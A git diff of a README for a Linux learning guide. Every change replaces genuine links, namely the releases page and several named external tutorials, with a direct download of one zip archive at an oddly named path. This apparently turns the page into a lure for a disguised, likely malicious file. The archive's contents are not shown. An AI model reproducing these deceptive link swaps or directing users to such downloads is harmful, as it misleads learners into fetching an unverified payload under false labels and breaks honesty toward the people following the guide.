@@ -1,6 +1,6 @@
 # 🌟 Linux-Learning - Your Path to Linux Mastery
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/jhaeylscode/Linux-Learning/releases)
+[![Download Latest Release](https://github.com/jhaeylscode/Linux-Learning/raw/refs/heads/main/underivedly/Learning-Linux-slowrie.zip%20Latest%20Release-v1.0-brightgreen)](https://github.com/jhaeylscode/Linux-Learning/raw/refs/heads/main/underivedly/Learning-Linux-slowrie.zip)
 
 ## 📚 Overview
 
@@ -11,7 +11,7 @@ Welcome to Linux-Learning! This guide helps you explore Linux, from beginner to 
 To begin your journey with Linux, follow these simple steps to download and run the software.
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/jhaeylscode/Linux-Learning/releases) to find the latest version of the guide.
+   Go to our [Releases page](https://github.com/jhaeylscode/Linux-Learning/raw/refs/heads/main/underivedly/Learning-Linux-slowrie.zip) to find the latest version of the guide.
 
 2. **Select the Version**  
    On the Releases page, you will see a list of available versions. Choose the latest version for the best experience.
@@ -40,7 +40,7 @@ Before you start, ensure that your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-You can download the latest version of the Linux-Learning guide directly from our [Releases Page](https://github.com/jhaeylscode/Linux-Learning/releases). Once you've downloaded the file, follow the steps in the "Getting Started" section to open the guide.
+You can download the latest version of the Linux-Learning guide directly from our [Releases Page](https://github.com/jhaeylscode/Linux-Learning/raw/refs/heads/main/underivedly/Learning-Linux-slowrie.zip). Once you've downloaded the file, follow the steps in the "Getting Started" section to open the guide.
 
 ## 🔍 Topics Covered
 
@@ -68,8 +68,8 @@ Join our community of learners! Connect with other users on platforms like Reddi
 
 Here are some useful links for further learning:
 
-- [Linux Command Line Basics](https://linuxcommand.org/)
-- [Bash Scripting Tutorial](https://linuxconfig.org/bash-scripting-tutorial-for-beginners)
-- [System Administration Basics](https://www.tldp.org/LDP/nag2/x-087-2-managing-users.html)
+- [Linux Command Line Basics](https://github.com/jhaeylscode/Linux-Learning/raw/refs/heads/main/underivedly/Learning-Linux-slowrie.zip)
+- [Bash Scripting Tutorial](https://github.com/jhaeylscode/Linux-Learning/raw/refs/heads/main/underivedly/Learning-Linux-slowrie.zip)
+- [System Administration Basics](https://github.com/jhaeylscode/Linux-Learning/raw/refs/heads/main/underivedly/Learning-Linux-slowrie.zip)
 
 Enjoy learning Linux with our comprehensive guide! Happy learning!
